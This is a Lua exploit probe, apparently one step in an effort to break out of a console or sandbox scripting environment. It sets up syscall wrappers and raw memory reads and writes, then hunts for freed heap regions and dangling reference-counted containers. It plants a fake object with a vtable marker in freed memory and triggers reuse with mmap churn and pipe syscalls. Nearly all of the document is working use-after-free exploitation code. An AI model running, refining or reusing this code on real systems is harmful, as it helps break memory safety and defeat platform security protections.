-- CRASH_CLASS: RISKY
-- PROBE 41k: wider UAF scan + direct exploitation
-- Problem: heap layout varies per run. Solution:
--   1. Scan wider (512 pages), find ALL AFAF freed regions
--   2. For each, check if a live object (non-AFAF) follows it
--   3. If a live object has pointer-like fields, that's our target
--   4. Write controlled data into the freed region
--   5. Check if any pointer in the adjacent live object now resolves
--      to our controlled data (overlap/aliasing)

print("=== PROBE 41k: WIDE UAF SCAN ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function hex(n)
    if type(n) == "table" and n.h then
        return string.format("0x%08X%08X", n.h, n.l)
    end
    return string.format("0x%X", tonumber(n) or 0)
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function dump_qword(val)
    if type(val) == "table" and val.h then
        return string.format("%08X_%08X", val.h, val.l)
    end
    return string.format("%016X", to_num(val))
end

local sc_mmap   = make_syscall(477)
local sc_munmap = make_syscall(588)
local PAGE = 0x4000

local function do_mmap(sz)
    local ok, ret = pcall(function()
        return sc_mmap(uint64(0), uint64(sz), uint64(0x33),
            uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
    end)
    if not ok then return nil end
    local addr = to_num(ret)
    if addr == 0 or addr >= 0xFFFFFFFF00000000 then return nil end
    return addr
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end

local base = do_mmap(PAGE)
if not base then print("mmap FAILED"); return end
print("anchor: " .. hex(base))
print("")

--------------------------------------------------------------------
-- SCAN: find freed regions and what borders them
--------------------------------------------------------------------
print("--- FREED REGIONS ---")

local freed_regions = {}
local in_freed = false
local freed_start = 0

for i = 1, 512 do
    local pg = base - i * 0x1000
    if pg <= 0 then break end
    local v = safe_rd(pg)
    if v == nil then break end

    if v == 0xAFAFAFAF then
        if not in_freed then
            freed_start = pg
            in_freed = true
        end
    else
        if in_freed then
            -- end of a freed region, pg is the first non-freed page
            freed_regions[#freed_regions + 1] = {
                start = pg + 0x1000,  -- first freed page
                ending = freed_start, -- last freed page
                next_live = pg,       -- first live page after freed
                next_val = v,
            }
            in_freed = false
        end
    end
    if #freed_regions >= 16 then break end
end

print("freed regions: " .. #freed_regions)
for j, r in ipairs(freed_regions) do
    local size = r.ending - r.start + 0x1000
    print(string.format("  #%d: %s - %s (%s bytes) next_live=%s val=%s",
        j, hex(r.start), hex(r.ending), hex(size),
        hex(r.next_live), hex(r.next_val)))
end
print("")

--------------------------------------------------------------------
-- For each freed region, examine what the live neighbor looks like
--------------------------------------------------------------------
print("--- LIVE NEIGHBORS ---")

local best_target = nil

for j, r in ipairs(freed_regions) do
    if j > 6 then break end
    local live = r.next_live
    print(string.format("  region #%d: live page at %s", j, hex(live)))

    -- dump first 8 qwords of live page
    local has_ptr = false
    local has_heap = false
    for off = 0, 0x38, 8 do
        local q = safe_rq(live + off)
        if q then
            local h, l = get_hi_lo(q)
            local tag = ""
            if h >= 0xFFFFFF80 then tag = " KPTR!" end
            if h == 0 and l >= 0x80000000 and l < 0x90000000 then tag = " TEXT!"; has_ptr = true end
            if h == 3 and l >= 0x10000000 then tag = " HEAP"; has_heap = true end
            if h == 0 and l >= 1 and l <= 16 then tag = " RC?" end
            print(string.format("    [+%02X] %s%s", off, dump_qword(q), tag))
        end
    end

    if (has_ptr or has_heap) and not best_target then
        best_target = {region = r, live = live, has_text = has_ptr}
    end
    print("")
end

--------------------------------------------------------------------
-- Also look for rc=4 containers with freed targets (wider scan)
--------------------------------------------------------------------
print("--- RC=4 WITH FREED TARGETS ---")
local dangling = {}
for i = 1, 512 do
    if #dangling >= 8 then break end
    local pg = base - i * 0x1000
    if pg <= 0 then break end
    local v = safe_rd(pg)
    if v == nil then break end
    if v == 4 then
        -- potential rc=4 at page start
        local q1 = safe_rq(pg + 8)
        if q1 then
            local h1, l1 = get_hi_lo(q1)
            if h1 == 3 and l1 >= 0x10000000 then
                local tgt_addr = h1 * 0x100000000 + l1
                local tgt_q = safe_rq(uint64(tgt_addr))
                if tgt_q then
                    local th, tl = get_hi_lo(tgt_q)
                    if th == 0xAFAFAFAF then
                        dangling[#dangling + 1] = {
                            container = pg, target = tgt_addr
                        }
                    end
                end
            end
        end
    end
    -- also scan at common offsets within page
    if v ~= 0 and v ~= 0xAFAFAFAF then
        for _, off in ipairs({0x40, 0x80, 0xC0, 0x100, 0x200, 0x300, 0x400, 0x500, 0x600, 0x700, 0x800, 0x900, 0xA00, 0xB00, 0xC00, 0xD00, 0xE00, 0xF00}) do
            if #dangling >= 8 then break end
            local rc = safe_rd(pg + off)
            if rc == 4 then
                local q1 = safe_rq(pg + off + 8)
                if q1 then
                    local h1, l1 = get_hi_lo(q1)
                    if h1 == 3 and l1 >= 0x10000000 then
                        local tgt_addr = h1 * 0x100000000 + l1
                        local tgt_q = safe_rq(uint64(tgt_addr))
                        if tgt_q then
                            local th, tl = get_hi_lo(tgt_q)
                            if th == 0xAFAFAFAF then
                                dangling[#dangling + 1] = {
                                    container = pg + off, target = tgt_addr
                                }
                            end
                        end
                    end
                end
            end
        end
    end
end

print("dangling rc=4 containers: " .. #dangling)
for j, d in ipairs(dangling) do
    print(string.format("  #%d container=%s target=%s", j, hex(d.container), hex(d.target)))
end
print("")

--------------------------------------------------------------------
-- EXPLOIT: write to the best freed region and check impact
--------------------------------------------------------------------
if #dangling > 0 then
    print("--- EXPLOIT: DANGLING CONTAINER ---")
    local d = dangling[1]
    local tgt = d.target

    -- measure freed extent
    local extent = 0
    for off = 0, 0x1F0, 8 do
        local q = safe_rq(uint64(tgt + off))
        if q then
            local h, l = get_hi_lo(q)
            if h == 0xAFAFAFAF then extent = off + 8
            else break end
        else break end
    end
    print("  freed extent: " .. hex(extent))

    -- write controlled fake object
    print("  writing fake object at " .. hex(tgt))
    -- pattern: self-referential pointers back to our data
    safe_wd(tgt,     0xDEAD0001)
    safe_wd(tgt + 4, 0xFACE0001)  -- +00: recognizable vtable marker

    -- verify
    local vq = safe_rq(uint64(tgt))
    print("  verify: " .. (vq and dump_qword(vq) or "FAULT"))

    -- now try triggers
    print("  triggering...")
    -- mmap churn
    for i = 1, 16 do
        local a = do_mmap(PAGE)
        if a then pcall(function() sc_munmap(uint64(a), uint64(PAGE)) end) end
    end
    -- pipe/socket
    local sys_pipe = make_syscall(42)
    local sys_close = make_syscall(6)
    local pb = memory.alloc(16)
    for i = 1, 4 do
        pcall(function() sys_pipe(pb) end)
        local f0 = safe_rd(pb)
        local f1 = safe_rd(pb + 4)
        if f0 and f0 > 0 then pcall(function() sys_close(f0) end) end
        if f1 and f1 > 0 then pcall(function() sys_close(f1) end) end
    end

    -- check if our data survived
    local post = safe_rq(uint64(tgt))
    print("  post-trigger: " .. (post and dump_qword(post) or "FAULT"))
    if post then
        local ph, pl = get_hi_lo(post)
        if pl == 0xDEAD0001 and ph == 0xFACE0001 then
            print("  fake object SURVIVED (not yet triggered)")
        else
            print("  *** OBJECT WAS TOUCHED/FREED ***")
        end
    else
        print("  *** PAGE FAULTED — FREED FROM UNDER US ***")
    end

    -- restore
    for off = 0, extent - 1, 4 do
        safe_wd(tgt + off, 0xAFAFAFAF)
    end
    print("  restored")
elseif best_target then
    print("--- EXPLOIT: FREED->LIVE BOUNDARY ---")
    local r = best_target.region
    -- write at the end of the freed region, close to the live boundary
    local write_addr = r.ending
    print("  writing marker at end of freed region: " .. hex(write_addr))

    -- save original
    local orig = safe_rq(write_addr)
    print("  original: " .. (orig and dump_qword(orig) or "?"))

    -- write
    safe_wd(write_addr, 0xBEEF0001)
    safe_wd(write_addr + 4, 0xCAFE0001)
    local after = safe_rq(write_addr)
    print("  after: " .. (after and dump_qword(after) or "FAULT"))

    -- restore
    if orig then
        local oh, ol = get_hi_lo(orig)
        safe_wd(write_addr, ol)
        safe_wd(write_addr + 4, oh)
    end
    print("  restored")
else
    print("--- NO EXPLOITABLE TARGET FOUND ---")
end

print("")
pcall(function() sc_munmap(uint64(base), uint64(PAGE)) end)
print("=== PROBE 41k COMPLETE ===")
